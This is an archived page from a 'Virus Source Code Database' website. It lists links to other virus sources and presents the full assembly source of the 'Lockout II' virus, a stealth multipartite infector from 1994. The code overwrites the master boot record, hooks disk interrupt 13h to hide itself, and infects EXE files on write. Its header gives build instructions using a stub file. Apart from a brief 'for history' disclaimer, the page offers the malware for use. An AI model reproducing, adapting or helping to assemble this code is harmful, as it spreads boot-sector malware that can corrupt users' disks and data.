<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: lockout2_asm</title>
<meta name="KEYWORDS" content="lockout2.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for lockout2.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="lamark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lamark_asm.php">lamark_asm</a><br>
<a href="lct_599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_599_asm.php">lct_599_asm</a><br>
<a href="lct-599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-599_asm.php">lct-599_asm</a><br>
<a href="lct_762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct_762_asm.php">lct_762_asm</a><br>
<a href="lct-762_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lct-762_asm.php">lct-762_asm</a><br>
<a href="leap-fro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leap-fro_asm.php">leap-fro_asm</a><br>
<a href="leapfrog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leapfrog_asm.php">leapfrog_asm</a><br>
<a href="leech__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech__asm.php">leech__asm</a><br>
<a href="leech_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leech_asm.php">leech_asm</a><br>
<a href="lehi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehi_asm.php">lehi_asm</a><br>
<a href="lehigh___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh___asm.php">lehigh___asm</a><br>
<a href="lehigh__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh__asm.php">lehigh__asm</a><br>
<a href="lehigh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lehigh_asm.php">lehigh_asm</a><br>
<a href="lep-664a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lep-664a_asm.php">lep-664a_asm</a><br>
<a href="lepmisry_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lepmisry_asm.php">lepmisry_asm</a><br>
<a href="leprosb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosb2_asm.php">leprosb2_asm</a><br>
<a href="leprosy_2_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_2_c.php">leprosy_2_c</a><br>
<a href="leprosy_3_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_3_c.php">leprosy_3_c</a><br>
<a href="leprosy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy__asm.php">leprosy__asm</a><br>
<a href="leprosyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyb_asm.php">leprosyb_asm</a><br>
<a href="leprosy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosy_c.php">leprosy_c</a><br>
<a href="leprosyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprosyc_asm.php">leprosyc_asm</a><br>
<a href="leprsyb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb1_asm.php">leprsyb1_asm</a><br>
<a href="leprsyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leprsyb_asm.php">leprsyb_asm</a><br>
<a href="leps808d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leps808d_asm.php">leps808d_asm</a><br>
<a href="leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/leszop_asm.php">leszop_asm</a><br>
<a href="libertyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/libertyb_asm.php">libertyb_asm</a><br>
<a href="lisa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa__asm.php">lisa__asm</a><br>
<a href="lisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisa_asm.php">lisa_asm</a><br>
<a href="lisbon2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lisbon2_asm.php">lisbon2_asm</a><br>
<a href="lit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lit_asm.php">lit_asm</a><br>
<a href="littl139_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/littl139_asm.php">littl139_asm</a><br>
<a href="little__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/little__asm.php">little__asm</a><br>
<a href="load_sec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/load_sec_asm.php">load_sec_asm</a><br>
<a href="lock2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock2_asm.php">lock2_asm</a><br>
<a href="lock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lock_asm.php">lock_asm</a><br>
<a href="lockjaw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw__asm.php">lockjaw__asm</a><br>
<a href="lockjaw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockjaw_asm.php">lockjaw_asm</a><br>
<a href="lockout2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout2_asm.php">lockout2_asm</a><br>
<a href="lockout_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lockout_asm.php">lockout_asm</a><br>
<a href="loki1237_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki1237_asm.php">loki1237_asm</a><br>
<a href="loki_973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki_973_asm.php">loki_973_asm</a><br>
<a href="loki-973_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/loki-973_asm.php">loki-973_asm</a><br>
<a href="lokjawd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawd_asm.php">lokjawd_asm</a><br>
<a href="lokjawz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lokjawz_asm.php">lokjawz_asm</a><br>
<a href="lordzero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lordzero_asm.php">lordzero_asm</a><br>
<a href="lqcancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lqcancer_asm.php">lqcancer_asm</a><br>
<a href="ltbro299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro299_asm.php">ltbro299_asm</a><br>
<a href="ltbro307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro307_asm.php">ltbro307_asm</a><br>
<a href="ltbro321_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbro321_asm.php">ltbro321_asm</a><br>
<a href="ltbrt299_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/ltbrt299_asm.php">ltbrt299_asm</a><br>
<a href="lythyum_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/lythyum_asm.php">lythyum_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/g/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/g/index.php'" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;              LOCKOUT - II Virus (c) 1994 by Stormbringer
;             FULL Stealth Multi-Partite EXE/MBR Infector!
;                         ALL THAT IN 331 BYTES!
;
;Lockout II, the sequel to the Lockout COM/MBR virus, is a fully stealth
;EXE/MBR infector.  When it is first run, it will infect the MBR and reboot.
;After that point, it will be invisible to the user.  It infects EXE files
;whenever they are written to the disk.  When an infected file is read from
;the disk, it removes itself from the file.  For this reason, the infected
;files can be disinfected simply by PKZIP'ing them while LOCKOUT II is in
;memory.  The hard drive cannot be accessed unless the virus is in memory,
;i.e. you booted from the hard drive.
;
;The idea for this virus came as kinda a cross between TridenT's CLUST
;virus (Stealth .EXE infector, alpha test version) and my own LOCKOUT virus 
;(semi-stealth .COM/MBR infector).
;
;This virus needs a stub file, as it must be started at either the
;FeedertoEXE label or the EXEEntryPoint label.  A 2 byte file consisting
;of jmp 15e will work if you use "copy /b stub.com+lock2.com virus.com".
;
;                                                า  Stormbringer        
;                                              ออออออออออออออออฤฤฤฤฤ   
;                                                ะ                      


.model tiny
.radix 16
.code
        org 100
start:
                mbr_loc         equ     7c00    ;This is your initial IP
                mbr_offset      equ     7b00    ;Offset - Com Offset
                mem_offset      equ     -100    ;Offset of mem from COM 

setup_stack:
        mov     ax,cs
        cli
        mov     ss,ax                   ;SS:SP=0000:7C00
        mov     sp,mbr_loc
        sti
mem_res:
        sub     word ptr cs:[413],1
        mov     ax,word ptr cs:[413]            ;Reserve 1K memory
        mov     cl,6
        shl     ax,cl
        sub     ax,10
        mov     es,ax                           ;Get Segment
        mov     si,mbr_loc
        push    cs
        pop     ds
        mov     cx,100
        mov     di,cx
        repnz   movsw                           ;Copy virus to memory
        mov     ax,offset after_jump
        push    es
        push    ax
        retf                                    ;Jump to new copy

FeederToEXE:
        jmp     short EXEEntryPoint

after_jump:
        mov     ax,word ptr ds:[4c]
        mov     word ptr cs:[Int_13_IP],ax
        mov     ax,word ptr ds:[4e]                     ;Get int 13 vector
        mov     word ptr cs:[Int_13_CS],ax
        
        mov     ax,cs
        
        cli
        mov     bx,offset Int_13_Handler
        mov     word ptr ds:[4c],bx                     ;Hook Int 13
        mov     word ptr ds:[4e],ax
        sti

Load_Old_Sec:
        mov     bx,7c00
        push    ds                                      ;Load old MBR and
        pop     es                                      ;Partition Table
        mov     cx,8
        call    ReadSector
Jump_Old_Sec:
        db      0ea,0,7c,0,0                            ;Jump to Old MBR


EXEEntryPoint:
        push    cs cs
        pop     ds es

        call    getoffset
getoffset:
        pop     bp
        sub     bp,offset getoffset
       
        lea     bx,[end_prog+bp]
        mov     cl,1                    ;Read in MBR
        call    ReadSector

        mov     byte ptr ds:[bx+1fdh],'V' ;Mark as infected.

        mov     cl,8
        call    WriteSector             ;Save it on sector 8

        mov     byte ptr ds:[bp+2fdh],'V'
        mov     word ptr [bp+2fe],0aa55  ;Mark as an infected bootsector      
        
        lea     bx,[start+bp]
        mov     cl,1
        call    writesector             ;write virus over MBR
        

        db      0ea
        dw      0               ;Jmp FFFF:0000 - Cold reboot
        dw      0ffff


WriteSector:
        mov     ah,03
        jmp short DoSector
ReadSector:
        mov     ah,02
DoSector:
        mov     al,1
        mov     dx,80
        xor     ch,ch
        int     13
        ret
Int_13_Handler:

GoInt13:        
Int_13_Handler:
        cmp     dx,80
        jne     CheckIfEXE
        cmp     ah,03
        ja      CheckIfEXE          ;Is something trying to read virus?
        cmp     ah,2
        jb      CheckIfEXE
        cmp     cx,1
        jne     CheckIfEXE
Trying_To_Access_Infection:
        mov     cx,8                    ;Give 'em old sector
        jmp     short Go_Int_13
        
CheckIfEXE:
        cmp     ah,02     
        je      ISRead
        cmp     ah,03
        je      IsWrite

Go_Int_13:
db      0ea
Int_13_IP       dw      0
Int_13_CS       dw      0

IsRead:
        pushf
        call    dword ptr cs:[Int_13_IP]
        jc      DoneRead
        
        push    ax bx es ds si di
        push    cs
        pop     ds
        mov     si,100
        mov     di,bx
        add     di,30
        mov     cx,Int_13_Handler-start
        repz    cmpsb                    ;Check if infected
        jcxz    CoverInfection
        jmp     short DoneStealth
  CoverInfection:
        mov     word ptr es:[bx],'ZM'
        mov     di,bx
        add     di,30
        mov     cx,end_prog-start       ;Restore host
        xor     al,al
        repnz   stosb
DoneStealth:
        pop     di si ds es bx ax
  ReadGood:        
        clc
  DoneRead:
        retf    2
        
IsWrite:
        cmp     word ptr es:[bx],'ZM'
        jne     Go_Int_13
InfectEXE:
        cmp     word ptr es:[bx+04],80  ;is under 64k?
        jae     DoneInfectExe 
        push    ax bx cx es ds si di
        push    cs
        pop     ds
        add     bx,30
        mov     di,bx
        mov     cx,200-30
CheckIfZero:
        cmp     byte ptr es:[bx],0
        jnz     BadFile                 ;Check if infectable 
        inc     bx                      ;i.e. large set of zero's
        loop    CheckIfZero

        mov     word ptr es:[di-30],5cebh       ;add in jump
        mov     si,100
        mov     cx,end_prog-start               ;copy virus into file
        repnz   movsb
BadFile:
        pop     di si ds es cx bx ax
DoneInfectEXE:        
        jmp     Go_Int_13
end_prog:
end start

</textarea></td></tr></table></body></html>
